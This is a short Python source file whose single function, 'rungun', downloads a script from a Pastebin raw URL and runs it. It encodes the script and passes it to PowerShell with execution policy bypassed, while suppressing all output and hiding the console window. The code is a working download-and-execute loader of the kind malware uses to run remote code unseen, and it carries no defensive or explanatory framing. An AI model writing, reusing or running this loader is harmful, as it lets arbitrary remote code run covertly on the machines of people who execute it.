import subprocess
import base64
import urllib.request


def rungun():
    pastebin_url = "https://pastebin.com/raw/s5WB7EtG"
    
    try:
        with urllib.request.urlopen(pastebin_url) as response:
            ps_script = response.read().decode('utf-8')
        
        ps_bytes = ps_script.encode('utf-16le')
        ps_encoded = base64.b64encode(ps_bytes).decode('ascii')
        
        command = f'powershell.exe -ExecutionPolicy Bypass -EncodedCommand {ps_encoded}'
        
        subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        return True
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

